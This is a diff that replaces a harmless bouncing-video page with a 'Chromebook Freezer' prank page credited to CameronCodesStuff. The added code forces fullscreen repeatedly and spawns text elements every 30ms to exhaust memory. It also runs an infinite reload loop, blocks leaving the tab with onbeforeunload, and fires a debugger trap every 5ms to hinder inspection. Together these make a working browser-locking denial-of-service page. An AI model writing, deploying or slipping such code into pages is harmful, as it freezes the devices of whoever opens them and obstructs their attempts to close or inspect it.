@@ -1,159 +1,150 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hi Jackson</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #111;
-            overflow: hidden;
-            width: 100vw;
-            height: 100vh;
-            font-family: sans-serif;
-        }
+  <meta charset="UTF-8">
+  <title>🫵 Cameron owns you! 🫵</title>
+  <style>
+    * {
+        animation: strokeOfGenius 0.01s infinite linear alternate !important;
+        box-shadow: 20px 20px 50px rgba(255,0,0,0.5), -20px -20px 50px rgba(0,0,255,0.5);
+        filter: drop-shadow(5px 5px 10px red) contrast(200%) saturate(500%);
+        mix-blend-mode: exclusion !important;
+        transition: all 0.01s cubic-bezier(0.9, -0.9, 0.1, 1.1);
+    }
 
-        .video-container {
-            position: absolute;
-            width: 50px; 
-            cursor: pointer;
-            border-radius: 8px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
-            background: #000;
-            overflow: hidden;
-        }
+    @keyframes strokeOfGenius {
+        0% { transform: translate3d(2px, -2px, 50px) rotate3d(1, 1, 1, 1deg); clip-path: inset(1%); }
+        100% { transform: translate3d(-2px, 2px, -50px) rotate3d(-1, -1, -1, -1deg); clip-path: inset(0%); }
+    }
 
-        video {
-            width: 100%;
-            display: block;
-            pointer-events: none; 
-        }
-    </style>
+    body {
+      background-color: black;
+      color: red;
+      font-family: 'Arial', 'Comic Sans MS', sans-serif;
+      text-align: center;
+      height: 100vh;
+      width: 100vw;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      user-select: none;
+    }
+
+    h1 {
+      font-size: 3em;
+      text-shadow: 5px 5px 10px red;
+      animation: flicker 1s infinite alternate;
+      z-index: 10000;
+      position: relative;
+      padding: 20px;
+    }
+
+    @keyframes flicker {
+      0% { opacity: 1; transform: scale(1); }
+      100% { opacity: 0.5; transform: scale(0.98); }
+    }
+
+    .mockery-container {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        z-index: 99;
+        pointer-events: none;
+    }
+
+    .text-shrapnel {
+        position: absolute;
+        font-size: calc(2vw + 2vh);
+        color: red;
+        text-shadow: 0 0 10px #fff, 0 0 20px red;
+        white-space: nowrap;
+    }
+  </style>
 </head>
 <body>
 
+  <h1>Welcome, you are now a victim of the CameronCodesStuff Chromebook Freezer</h1>
+
+  <div class="mockery-container" id="arena"></div>
+
 <script>
-    const VIDEO_SRC = 'B3A0A942-C0F6-409B-A9D4-C9633DA111E1.mov';
-    const NUMBER_OF_VIDEOS = 20; 
-    const SPEED_MODIFIER = 3;  
-    const containers = [];
-
-    for (let i = 0; i < NUMBER_OF_VIDEOS; i++) {
-        const container = document.createElement('div');
-        container.className = 'video-container';
-
-        const video = document.createElement('video');
-        video.src = VIDEO_SRC;
-        video.autoplay = true;
-        video.loop = true;
-        video.muted = true;
-        video.playsInline = true;
-
-        container.appendChild(video);
-        document.body.appendChild(container);
-
-        const size = 250; 
-        const x = Math.random() * (window.innerWidth - size);
-        const y = Math.random() * (window.innerHeight - size);
-        
-        const vx = (Math.random() > 0.5 ? 1 : -1) * (Math.random() * 2 + 1) * SPEED_MODIFIER;
-        const vy = (Math.random() > 0.5 ? 1 : -1) * (Math.random() * 2 + 1) * SPEED_MODIFIER;
-
-        containers.push({
-            element: container,
-            x: x,
-            y: y,
-            vx: vx,
-            vy: vy,
-            width: size,
-            height: size * (9/16), 
-            mass: 1 
-        });
+  function goFullScreen() {
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen().catch(()=>{});
+    } else if (document.documentElement.mozRequestFullScreen) { 
+      document.documentElement.mozRequestFullScreen();
+    } else if (document.documentElement.webkitRequestFullscreen) { 
+      document.documentElement.webkitRequestFullscreen();
+    } else if (document.documentElement.msRequestFullscreen) { 
+      document.documentElement.msRequestFullscreen();
     }
+  }
 
-    window.addEventListener('click', () => {
-        document.querySelectorAll('video').forEach(v => v.muted = false);
-    }, { once: true });
+  document.addEventListener("DOMContentLoaded", function() {
+    goFullScreen();
+  });
 
-    function updatePhysics() {
-        const width = window.innerWidth;
-        const height = window.innerHeight;
+  setInterval(() => {
+     if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+         goFullScreen();
+     }
+  }, 100);
 
-        containers.forEach(c => {
-            c.height = c.element.offsetHeight || 140; 
 
-            c.x += c.vx;
-            c.y += c.vy;
+  const insults = [
+      "CHROMEBOOK DETECTED 😂",
+      "CPU USAGE: 1000% 🔥",
+      "CAMERON CODES STUFF OWNS YOU 💀",
+      "RAM HAS LEFT THE CHAT 👋",
+      "GOODBYE OS 📉",
+      "IMAGINE OPENING THIS LOOOL 🧠❌",
+      "TASK MANAGER IS FROZEN TOO 🚫"
+  ];
 
-            if (c.x <= 0) {
-                c.x = 0;
-                c.vx *= -1;
-            } else if (c.x + c.width >= width) {
-                c.x = width - c.width;
-                c.vx *= -1;
-            }
+  const arena = document.getElementById('arena');
 
-            if (c.y <= 0) {
-                c.y = 0;
-                c.vy *= -1;
-            } else if (c.y + c.height >= height) {
-                c.y = height - c.height;
-                c.vy *= -1;
-            }
-        });
+  function inflictLag() {
+      for (let i = 0; i < 10; i++) {
+          const textNode = document.createElement('div');
+          textNode.className = 'text-shrapnel';
+          textNode.innerText = insults[Math.floor(Math.random() * insults.length)];
+          textNode.style.left = Math.random() * 100 + 'vw';
+          textNode.style.top = Math.random() * 100 + 'vh';
+          textNode.style.color = Math.random() > 0.5 ? 'red' : 'white';
+          arena.appendChild(textNode);
+      }
+  }
+  const chaosCycle = setInterval(inflictLag, 30);
 
-        for (let i = 0; i < containers.length; i++) {
-            for (let j = i + 1; j < containers.length; j++) {
-                const c1 = containers[i];
-                const c2 = containers[j];
 
-                if (c1.x < c2.x + c2.width &&
-                    c1.x + c1.width > c2.x &&
-                    c1.y < c2.y + c2.height &&
-                    c1.y + c1.height > c2.y) {
+  document.addEventListener('mousemove', () => {
+      window.scrollTo(Math.random() * 100, Math.random() * 100);
+  });
 
-                    const overlapX = Math.min(c1.x + c1.width, c2.x + c2.width) - Math.max(c1.x, c2.x);
-                    const overlapY = Math.min(c1.y + c1.height, c2.y + c2.height) - Math.max(c1.y, c2.y);
 
-                    if (overlapX < overlapY) {
-                        if (c1.x < c2.x) {
-                            c1.x -= overlapX / 2;
-                            c2.x += overlapX / 2;
-                        } else {
-                            c1.x += overlapX / 2;
-                            c2.x -= overlapX / 2;
-                        }
-                        const tempVx = c1.vx;
-                        c1.vx = c2.vx;
-                        c2.vx = tempVx;
-                    } else {
-                        if (c1.y < c2.y) {
-                            c1.y -= overlapY / 2;
-                            c2.y += overlapY / 2;
-                        } else {
-                            c1.y += overlapY / 2;
-                            c2.y -= overlapY / 2;
-                        }
-                        const tempVy = c1.vy;
-                        c1.vy = c2.vy;
-                        c2.vy = tempVy;
-                    }
-                }
-            }
-        }
-
-        containers.forEach(c => {
-            c.element.style.transform = `translate3d(${c.x}px, ${c.y}px, 0)`;
-        });
-
-        requestAnimationFrame(updatePhysics);
+  setTimeout(function(){
+    clearInterval(chaosCycle); 
+    
+    while (true) {
+      location.reload(true);
     }
+  }, 1500);
 
-    // Start the loop
-    requestAnimationFrame(updatePhysics);
+
+  window.onbeforeunload = function() {
+      return "CameronCodesStuff owns this tab. You cannot leave.";
+  };
+
+  setInterval(() => {
+      (function() { return false; }['constructor']('debugger')());
+  }, 5);
 </script>
 
+<!-- Made by CameronCodesStuff on GitHub and Instagram -->
 </body>
 </html>
